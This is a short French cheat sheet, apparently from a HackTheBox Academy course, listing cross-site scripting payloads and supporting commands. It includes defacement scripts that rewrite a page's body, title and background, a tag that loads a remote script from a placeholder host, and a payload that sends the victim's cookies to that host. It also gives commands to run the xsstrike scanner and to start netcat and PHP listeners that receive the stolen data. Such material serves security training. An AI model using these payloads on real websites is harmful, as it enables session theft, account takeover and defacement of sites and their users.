| `<script>document.body.style.background = "#141d2b"</script>` | Changer la couleur d'arrière-plan |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Changer l'image d'arrière-plan |
| `<script>document.title = 'HackTheBox Academy'</script>` | Changer le titre du site web |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` | Réécrire le corps principal du site web |
| `<script>document.getElementById('urlform').remove();</script>` | Supprimer un élément HTML spécifique |
| `<script src="http://NOTRE_IP/script.js"></script>` | Charger un script distant |
| `<script>new Image().src='http://NOTRE_IP/index.php?c='+document.cookie</script>` | Envoyer les détails du cookie vers nous |
| **Commandes** | |
| `python xsstrike.py -u "http://IP_SERVEUR:PORT/index.php?task=test"` | Exécuter `xsstrike` sur un paramètre d'URL |
| `sudo nc -lvnp 80` | Démarrer un écouteur `netcat` |
| `sudo php -S 0.0.0.0:80` | Démarrer un serveur `PHP` |
